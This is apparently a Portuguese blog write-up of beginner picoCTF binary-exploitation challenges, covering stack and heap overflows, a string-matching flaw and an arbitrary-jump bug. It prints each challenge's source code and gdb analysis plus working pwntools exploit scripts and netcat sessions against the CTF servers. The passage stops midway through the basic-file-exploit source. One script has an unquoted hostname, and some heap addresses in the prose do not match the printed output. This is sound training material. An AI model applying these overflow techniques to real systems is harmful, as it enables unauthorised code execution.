---
title: "Resolvendo os desafios iniciais de pwn do picoCTF"
date: 2024-08-02 00:00:00 -0300
published: 2024-08-02
description: "Esse é um writeup dos 15 desafios iniciais de pwning do picoGym. Você pode encontrar esses desafios em [picoGym](https://play.picoctf.org/practice). Há também um desafio extra no final do post de um outro CTF :)"
author: dkvhr
tags:
  - "pwn"
  - "ctf"
categories:
  - "Easy"
---

Esse é um writeup dos 15 desafios iniciais de pwning do picoGym. Você pode encontrar esses desafios em [picoGym](https://play.picoctf.org/practice). Há também um desafio extra no final do post de um outro CTF :) \
Vamos começar ^^

## buffer overflow 0

Nos é dado este arquivo C:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

Ao realizar um checksec, obtemos o seguinte resultado:

```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Antes de começar, criei uma flag de debug em um arquivo chamado flag.txt. Dessa forma, podemos fazer o programa rodar localmente.

Se olharmos o código, o arquivo flag.txt será lido e gravado em `char flag[FLAGSIZE]`. A única maneira de exibir o conteúdo da flag é acionando a função de sinal. Isso significa que, se causarmos um erro de segmentação, por exemplo, o conteúdo da flag será exibido.

Felizmente, o programa usa a função `gets`. Ela escreverá na variável `char buf1[100]` qualquer coisa que quisermos, sem considerar o tamanho. Se olharmos para a função `vuln`, veremos que ela copia do argumento de entrada (que será o buf1) para um buffer de tamanho 16.

Portanto, se sobrescrevermos o endereço de retorno da função `vuln` com algum valor inválido, isso definitivamente causará um erro de segmentação.

Você pode simplesmente colocar muitos caracteres `A` para garantir que o endereço de retorno seja sobrescrito com eles. Eu coloquei `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`. Ao analisar o programa no gdb, podemos ver isso:

![bof0](/images/davi-post-pwn/bof0/bof0.png)

O programa irá travar, pois temos 'AAAA' como endereço de retorno, e isso não é válido. Executando o programa fora do gdb, ele passará pela função sigsegv_handler, que nos dará a flag:

flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}`

## buffer overflow 1

Aqui está o arquivo C fornecido:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Ao realizar um checksec, obtemos o seguinte:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

Como o binário não possui um stack canary, podemos facilmente sobrescrever o endereço de retorno usando a função `gets` em `vuln()`.

Ao sobrescrever o endereço de retorno da função `vuln`, precisamos preencher todo o buffer `char buf[BUFSIZE]`, alguns outros valores intermediários e, em seguida, o endereço de retorno.

Executei o programa dentro do gdb e usei o comando pattern create -n 4. Também coloquei um ponto de interrupção na instrução ret da função vuln e executei. Quando solicitado por uma entrada, forneci o padrão gerado pelo gdb. Terminamos nesta situação:

![bof1](/images/davi-post-pwn/bof1/bof1.png)

Há algumas coisas importantes aqui.
Observe o endereço impresso na parte superior da tela: `Okay, time to return... Fingers Crossed... Jumping to 0x6161616c.`
O endereço de retorno impresso aqui é `0x6161616c`.

Podemos confirmar isso olhando para a pilha. Temos:
`0xffffd14c│+0x0000: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"` no topo.

Os primeiros 4 caracteres são `laaa`, que em hexadecimal é igual a `0x6161616c`. Este é o endereço de retorno sendo usado pela função. Isso significa que podemos simplesmente mudar o `laaa` em nossa entrada para o endereço de retorno que desejamos (no caso, a função `win`, para que possamos obter a flag).

Como não temos PIE, podemos simplesmente usar diretamente o endereço da função `win`, que é `0x080491f6` (você pode obtê-lo usando o comando `disas win` no gdb ou colocando o programa em um descompilador como Ghidra).

Juntando tudo isso, aqui está minha solução usando pwntools:

```python
context(arch = 'i386', os = 'linux')
r = remote(saturn.picoctf.net, 64507)
payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa'
payload += int.to_bytes(0x080491f6, 4, 'little')
r.sendline(payload)
r.recvline()
r.recvline()
r.interactive()
```

## buffer overflow 2

Aqui está o código-fonte:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

E aqui está o resultado do checksec:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Também temos uma função `gets` neste desafio. Comecei executando o gdb e usando o comando `pattern create -n 4`. Coloquei um ponto de interrupção na instrução `ret` da função `vuln` e forneci a entrada com o padrão gerado. Esta é uma captura de tela da minha instância do gdb:

![bof2](/images/davi-post-pwn/bof2/bof2.png)

Usei `pattern offset daabeaa` para encontrar em qual posição estou sobrescrevendo o endereço de retorno. 

Isso significa que precisamos escrever 112 bytes de _alguma coisa_ para chegar até o endereço de retorno. Eu sobrescrevi ele com o endereço da função `win` (Não temos PIE, então podemos pegar o endereço exatamente como ele é e fica tudo certo).

Depois de sobrescrever o endereço de retorno, também precisamos lidar com os argumentos da função. Se apenas escrevermos eles após o endereço de retorno, quando fizermos a comparação:

```c
if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
```

Isso aqui vai acontecer:

![bof22](/static/images/davi-post-pwn/bof2/bof22.png)

Perceba como `DWORD PTR [ebp+0x8]` contém `0xf00df00d` ao invés de `0xcafef00d`. Podemos resolver isso de forma simples ao adicionar 4 bytes extras logo antes do primeiro argumento para que tudo fique alinhado.

Até o momento nós temos: 112 bytes + return address + 4 bytes de padding + primeiro argumento da função + segundo argumento da função

Resolvi desse jeito aqui:

```python
from pwn import *

context(arch = "i386", os="linux", endian="little")

p = remote("saturn.picoctf.net", 58084)

payload = b'A' * 112
payload += p32(0x08049296)
payload += p32(0)
payload += p32(0xcafef00d)
payload += p32(0xf00df00d)

p.sendline(payload)
p.interactive()
```

## x sixty what

Esse challenge é similar aos anteriores. A principal diferença é que agora nós temos um arquivo de 64 bits. Aqui está o source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

E aqui está o resultado do checksec:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

A função `vuln` usa `gets` para escrever no buffer de tamanho 64. Como o binário não usa PIE, podemos simplesmente sobrescrever o endereço de retorno com o endereço da função flag conforme vemos no binário.

Nosso payload precisa de 64 bytes para preencher o buffer + 8 bytes para escrever no `rbp` + o endereço de retorno que queremos sobrescrever.

Aqui está o meu solve usando o pwntools:
```python
from pwn import *

context(arch = "amd64", os="linux", endian="little")

p = remote("saturn.picoctf.net", 63716)

payload = b'A' * 72
payload += p64(0x000000000040123b)

p.sendline(payload)
p.recvline()
p.interactive()
```

Que nos dá a flag: `picoCTF{b1663r_15_b3773r_d95e02b6}`

## Local Target 

Aqui está o source code:

```c
#include <stdio.h>
#include <stdlib.h>



int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;

  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");

  printf("num is %d\n", num);
  fflush(stdout);

  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }

  printf("Bye!\n");
  fflush(stdout);
}
```

E aqui está o checksec:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Inspecionando o código fonte, precisamos acionar esta condição: `if( num == 65 )`. Mas num é declarado como `64` logo após nossa variável `input`. Felizmente, há uma função `gets` que escreve em `input`. Podemos usá-la para causar um buffer overflow e sobrescrever `num`, que é uma variável local e, portanto, armazenada na pilha.

Precisamos fornecer uma entrada que sobrescreva nosso buffer de caracteres, sobreponha o espaço entre o buffer e a variável `num`, e então sobrescreva a própria variável `num`. Como queremos que `num` seja `65`, podemos simplesmente escrever o caractere `A` nele, já que o valor ASCII de `A` é `65`.

Aqui está o meu solve:

```
nc saturn.picoctf.net 56776
Enter a string: AAAAAAAAAAAAAAAABBBBBBBBA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_ee58441a}
```

flag: `picoCTF{l0c4l5_1n_5c0p3_ee58441a}`

## clutter overflow

Aqui o source code:

```c
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER =
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts(HEADER);
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
```

E aqui o checksec:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Como podemos ver no código fonte, `clutter` é um buffer de caracteres com tamanho `0x100`. Precisamos sobrescrever a variável `long code` com o valor `0xdeadbeef` para imprimir a flag.

Como é uma variável local, `long code` provavelmente estará na pilha. Vamos inserir um breakpoint logo antes da função `gets` e dar uma olhada na pilha nesse momento:

![cof1](/images/davi-post-pwn/clutter-overflow/co1.png)

`0x7fffffffdff0` é o endereço no registro `rbp`. Se olharmos para o valor imediatamente antes disso, há uma série de 0's, que provavelmente são a variável `code`. Eles estão no endereço `0x7fffffffdfe8`. Fazendo uma simples matemática com o endereço do topo da pilha e o endereço da variável, obtemos: `0x7fffffffdfe8 - 0x7fffffffdee0 = 264`. Portanto, precisamos fornecer uma entrada de 264 caracteres + 0xdeadbeef para sobrescrever precisamente a variável code com o `GOAL`.

Aqui o meu solve:

```python
from pwn import *

p = remote("mars.picoctf.net", 31890)

payload = b'A' * 264
payload += p64(0xdeadbeef)

p.sendline(payload)
p.interactive()
```

## RPS

Esse é um chall simples em que você só precisa ler o source code e ver o que está errado. Aqui está ele:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60



static const char* flag = "[REDACTED]";

char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
int wins = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;

    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }


    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set,
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case.
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    }

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


bool play () {
  char player_turn[100];
  srand(time(0));
  int r;

  printf("Please make your selection (rock/paper/scissors):\n");
  r = tgetinput(player_turn, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  int computer_turn = rand() % 3;
  printf("You played: %s\n", player_turn);
  printf("The computer played: %s\n", hands[computer_turn]);

  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
}


int main () {
  char input[3] = {'\0'};
  int command;
  int r;

  puts("Welcome challenger to the game of Rock, Paper, Scissors");
  puts("For anyone that beats me 5 times in a row, I will offer up a flag I found");
  puts("Are you ready?");

  while (true) {
    puts("Type '1' to play a game");
    puts("Type '2' to exit the program");
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }

    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");

    } else if (command == 1) {
      printf("\n\n");
      if (play()) {
        wins++;
      } else {
        wins = 0;
      }

      if (wins >= 5) {
        puts("Congrats, here's the flag!");
        puts(flag);
      }
    } else if (command == 2) {
      return 0;
    } else {
      puts("Please type either 1 or 2");
    }
  }

  return 0;
}
```

Precisamos vencer 5 vezes consecutivas para obter a flag. Para verificar se sua jogada vence contra a jogada do computador, o programa faz uma `strstr(player_turn, loses[computer_turn])`. Ele verifica se sua entrada de string contém a string da jogada que ganha.

Se fornecermos uma entrada de `rockpaperscissors`, essa verificação sempre será verdadeira, já que temos todas as possibilidades no array `loses`. Resolvi isso manualmente:

```
nc saturn.picoctf.net 50553
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1

Please make your selection (rock/paper/scissors):
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1

Please make your selection (rock/paper/scissors):
rockpaperscissors
You played: rockpaperscissors
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1

Please make your selection (rock/paper/scissors):
rockpaperscissors
You played: rockpaperscissors
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1

Please make your selection (rock/paper/scissors):
rockpaperscissors
You played: rockpaperscissors
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1

Please make your selection (rock/paper/scissors):
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
Type '1' to play a game
Type '2' to exit the program
2
Ncat: Broken pipe.
```

Podemos ver a flag após 5 vitórias:

flag: `picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}`

## heap 0

Aqui o source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap0!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
        int rval = scanf("%d", &choice);
        if (rval == EOF){
            exit(0);
        }
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
            exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

E aqui o checksec:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Para vencer, precisamos fazer com que a comparação \
`if (strcmp(safe_var, "bico") != 0)` funcione. Isso significa que `safe_var` precisa ser diferente de `"bico"`.

`safe_var` é definido globalmente, mas o usamos na função `init()` para torná-lo uma string com `"bico"`:
```c
safe_var = malloc(SAFE_VAR_SIZE);
strncpy(safe_var, "bico", SAFE_VAR_SIZE);
```

Quando usamos a função `write_buffer()`, fazemos um `scanf` de uma string e a inserimos na variável `input_data`. Se você prestar atenção, `input_data` e `safe_var` são alocados com `malloc` uma após a outra, o que significa que provavelmente também estão localizados sequencialmente (ou bem próximos um do outro) na memória. O `print_heap()` confirma isso quando o executamos:

```
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x55bc1d8756b0  ->   pico
+-------------+----------------+
[*]   0x55bc1d8756d0  ->   bico
+-------------+----------------+
```

`pico` está no endereço `0x557a2f2bd6b0` e `bico` está no endereço `0x557a2f2bd6d0`. Isso é uma distância de 32 bytes. Se escrevermos em `input_data` com 32 bytes + _algo mais_, esse _algo mais_ será escrito na variável `safe_var`.

Você pode escrever a seguinte entrada na função `write_buffer`: \
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnoop`

Depois disso, você pode verificar usando `print_heap()` que realmente mudamos `safe_var`:

```
Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x55bc1d8756b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnoop
+-------------+----------------+
[*]   0x55bc1d8756d0  ->   noop
+-------------+----------------+
```

Podemos então apenas imprimir a flag.

flag: `picoCTF{my_first_heap_overflow_76775c7c}`

## heap 1

No heap 1, temos quase o mesmo código de heap 0. No entanto, a comparação usada para pegar a flag é diferente. Aqui está como é feita em heap 1:

```c
if (!strcmp(safe_var, "pico"))
```

A única diferença aqui é que agora queremos que `safe_var` seja `"pico"`.

Na solução anterior, alteramos `safe_var` para `noop`. Podemos usar a mesma solução, mas alterando para `"pico"`:

Entrada para a função write_buffer:
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico`

flag: `picoCTF{starting_to_get_the_hang_e9fbcea5}`

## Picker IV

Source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

checksec:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Parece que o código solicitará um endereço em hexadecimal e saltará para ele. Como não temos PIE, podemos simplesmente escolher o endereço sem preocupações. Usei o gdb para obter o endereço da função `win`: `0x40129e`.

O `scanf` lerá um valor hexadecimal, então fiz o seguinte:
```
nc saturn.picoctf.net 59045
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}
```

flag: `picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}`

## basic-file-exploit

O source code é meio longo, mas aqui está ele:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60


static const char* flag = "[REDACTED]";

static char data[10][100];
static int input_lengths[10];
static int inputs = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;

    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }


    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set,
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case.
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    }

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


static void data_write() {
  char input[100];
  char len[4];
  long length;
  int r;

  printf("Please enter your data:\n");
  r = tgetinput(input, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  while (true) {
    printf("Please enter the length of your data:\n");
    r = tgetinput(len, 4);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }

    if ((length = strtol(len, NULL, 10)) == 0) {
      puts("Please put in a valid length");
    } else {
      break;
    }
  }

  if (inputs > 10) {
    inputs = 0;
  }

  strcpy(data[inputs], input);
  input_lengths[inputs] = length;

  printf("Your entry number is: %d\n", inputs + 1);
  inputs++;
}


static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, '\0', 100);

  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
